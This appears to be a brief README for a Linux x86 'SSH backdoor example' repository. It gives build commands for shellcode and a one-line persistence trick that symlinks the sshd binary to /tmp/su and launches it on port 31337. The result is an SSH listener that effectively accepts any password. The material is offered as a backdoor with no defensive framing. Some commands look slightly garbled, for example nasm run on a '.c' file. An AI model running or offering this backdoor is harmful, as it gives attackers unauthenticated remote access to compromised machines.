# sshd-backdoor-example- linux-x86
SSH Backdoor example !

## Compile ASM
strace -e execve,symlink ./a.out 
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;

OR $nasm -f elf shellcode.c and ld -s -o shellcode shellcode.o
